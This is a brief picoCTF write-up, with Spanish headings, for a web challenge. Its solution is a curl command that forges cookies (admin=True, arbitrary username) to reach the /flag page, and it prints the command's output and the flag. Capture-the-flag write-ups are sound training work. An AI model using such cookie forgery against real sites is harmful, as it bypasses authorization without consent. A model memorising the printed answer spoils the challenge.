### Descripción
The factory is hiding things from all of its users.

Can you login as Joe and find what they've been looking at? [http://fickle-tempest.picoctf.net:58784](http://fickle-tempest.picoctf.net:58784/)

Hint: Hmm it doesn't seem to check anyone's password, except for Joe's?
### Solución
En la terminal usamos el comando curl
```
~ via 🐍 v3.13.5 
➜ curl http://fickle-tempest.picoctf.net:54587/flag -H "Cookie: password=hola; username=hola; admin=True" | grep pico

 % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100   1312 100   1312   0      0    282      0   00:04   00:04            458
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}</code></p>
```

**Flag**: picoCTF{th3_c0nsp1r4cy_l1v3s_4d184b0d}
### Notas Adicionales

### Referencias